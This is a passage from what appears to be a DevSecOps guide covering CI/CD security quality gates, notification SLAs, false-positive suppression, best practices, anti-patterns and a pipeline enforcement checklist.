  needs:
    - sast
    - secret-detection
    - dependency-scanning
    - container-scanning
    - iac-scanning
```

---

## Quality Gates and Thresholds

### Recommended Thresholds

```yaml
# security-gate-config.yml
quality_gates:
  blocking_criteria:
    # These conditions will BLOCK deployment
    critical_vulnerabilities: 0      # Zero critical findings allowed
    high_vulnerabilities_max: 5      # Maximum 5 high findings
    secrets_detected: 0              # Zero secrets in code
    license_violations: 0            # Zero copyleft license violations
    unsigned_artifacts: 0            # All artifacts must be signed

  warning_criteria:
    # These conditions generate warnings but do not block
    medium_vulnerabilities_max: 20
    low_vulnerabilities_max: 50
    dependencies_outdated_max: 10
    scan_coverage_minimum: 80        # Percentage

  exemptions:
    # Accepted risks with documentation
    - finding_id: "CVE-2023-12345"
      reason: "Not exploitable in our configuration"
      approved_by: "security-lead@example.com"
      expires: "2024-06-30"
      compensating_control: "WAF rule blocks attack vector"
```

### Notification and Remediation Workflow

```yaml
# Notification workflow
notifications:
  critical_finding:
    channels:
      - slack: "#security-alerts"
      - pagerduty: "security-oncall"
      - email: "security-team@example.com"
    sla: "1 hour acknowledgment, 24 hours resolution"

  high_finding:
    channels:
      - slack: "#security-findings"
      - email: "team-lead@example.com"
    sla: "4 hours acknowledgment, 7 days resolution"

  medium_finding:
    channels:
      - jira: "Create ticket in SECURITY project"
    sla: "30 days resolution"

  low_finding:
    channels:
      - jira: "Create ticket in BACKLOG"
    sla: "90 days resolution"
```

---

## Managing False Positives at Scale

```yaml
# False positive management strategy

# 1. Tool-level suppression (inline)
# Semgrep: nosemgrep comment
def safe_function():
    eval(CONSTANT_VALUE)  # nosemgrep: python.lang.security.eval-detected

# 2. Centralized suppression file
# .semgrepignore
tests/
fixtures/
*_test.py
*.spec.js
vendor/

# 3. False positive tracking database
false_positive_registry:
  - tool: semgrep
    rule_id: python.lang.security.eval-detected
    file: src/template_engine.py
    line: 42
    reason: "Eval operates on internally generated AST, not user input"
    reviewed_by: "security-champion@example.com"
    reviewed_date: "2024-01-15"
    review_expiry: "2024-07-15"  # Re-review required

  - tool: trivy
    cve: "CVE-2023-44487"
    package: "golang.org/x/net"
    reason: "HTTP/2 rapid reset: mitigated by WAF rate limiting"
    reviewed_by: "security-lead@example.com"
    reviewed_date: "2024-01-20"
    compensating_control: "WAF configured with HTTP/2 connection limits"
```

---

## Best Practices

1. **Fail the build on critical findings.** Configure security tools to return non-zero exit codes for critical and high-severity vulnerabilities. Never allow critical findings to proceed to production.

2. **Run security scans in parallel with other CI stages.** SAST, SCA, secrets scanning, and license checks are independent. Run them concurrently to minimize pipeline duration.

3. **Generate and store SBOMs for every release.** Software Bill of Materials provides transparency into dependencies and accelerates incident response when new CVEs are disclosed.

4. **Sign all build artifacts.** Use Cosign, Notation, or similar tools to cryptographically sign container images and verify signatures before deployment.

5. **Use SARIF format for unified reporting.** Standardize on SARIF (Static Analysis Results Interchange Format) to aggregate findings from multiple tools in a single dashboard.

6. **Version-control all security tool configurations.** Store Semgrep rules, Checkov configs, ZAP rules, and suppression files in the repository alongside application code.

7. **Implement graduated scanning.** Run fast, lightweight scans (secrets, linting) on every commit. Run heavier scans (DAST, full container scan) on merges to main or nightly.

8. **Protect the pipeline itself.** Require MFA for CI/CD platform access, audit pipeline configuration changes, use ephemeral build agents, and rotate secrets regularly.

9. **Track false positive rates per tool.** Monitor the ratio of true positives to false positives. If a tool produces more than 30% false positives, tune its configuration or evaluate alternatives.

10. **Establish clear escalation paths.** Define who gets notified for each severity level, required response times, and escalation procedures when SLAs are missed.

---

## Anti-Patterns

1. **Security scanning without acting on results.** Running SAST/SCA tools but never reviewing or fixing findings creates a false sense of security and accumulates hidden risk.

2. **Making security scans optional or skippable.** If developers can bypass security checks with a flag or by pushing directly to protected branches, the checks provide no value.

3. **Storing secrets in pipeline configuration.** Embedding API keys, passwords, or tokens directly in CI/CD YAML files or environment variables without a secrets manager is a common breach vector.

4. **Running all scans sequentially.** Serial execution of independent security scans unnecessarily extends pipeline duration, leading developers to push for removing security steps.

5. **No baseline or suppression mechanism.** Without a way to suppress known false positives, developers are overwhelmed by noise and ignore all findings.

6. **Scanning only the default branch.** Security scans must run on pull requests and feature branches. Scanning only main means vulnerabilities are detected after merge, when they are harder to fix.

7. **Using outdated security tool rule sets.** Failing to update SAST rules, vulnerability databases, and scanning tool versions means new vulnerability patterns are missed.

8. **Deploying without verifying artifact integrity.** Skipping signature verification before deployment allows tampered or unauthorized artifacts to reach production.

---

## Enforcement Checklist

```text
Pre-Commit Stage:
[ ] Secrets scanning configured (detect-secrets or gitleaks)
[ ] Security linters enabled for all languages (bandit, eslint-plugin-security)
[ ] Pre-commit hook installation documented in onboarding guide
[ ] Private key detection enabled

Commit/PR Stage:
[ ] SAST tool running on every PR (Semgrep, CodeQL)
[ ] SCA tool checking all dependencies (Snyk, Dependabot)
[ ] License compliance check configured with allow/deny lists
[ ] Commit signing required on protected branches
[ ] PR template includes security review checklist
[ ] Minimum reviewer requirement includes security champion

Build Stage:
[ ] Container images scanned for OS and library vulnerabilities (Trivy, Grype)
[ ] SBOM generated in SPDX or CycloneDX format for every build
[ ] IaC templates scanned (Checkov, tfsec)
[ ] Dependency integrity verified (hash pinning, lock files)
[ ] Build runs on ephemeral, hardened agents

Test Stage:
[ ] DAST baseline scan runs against staging environment
[ ] API security tests validate authentication and authorization
[ ] Security-focused integration tests included in test suite
[ ] Test results uploaded as SARIF to security dashboard

Pre-Deploy Stage:
[ ] Security quality gate evaluates all scan results
[ ] Critical findings block deployment (zero tolerance)
[ ] Environment security configuration validated
[ ] Required approvals obtained for production deployments

Deploy Stage:
[ ] Artifact signatures verified before deployment
[ ] Deployment events logged to immutable audit trail
[ ] Canary deployments enabled for production
[ ] Rollback procedure tested and documented

Post-Deploy Stage:
[ ] Runtime security monitoring active (Falco, RASP)
[ ] Full DAST scan scheduled nightly
[ ] Alerting configured for security events
[ ] Incident response runbook linked and accessible

Pipeline Security:
[ ] CI/CD platform access requires MFA
[ ] Pipeline configuration changes are audited
[ ] Secrets managed through dedicated secrets manager
[ ] Build agents are ephemeral and rebuilt regularly
[ ] Pipeline service accounts use least-privilege permissions
[ ] Third-party GitHub Actions/GitLab templates pinned by SHA
```
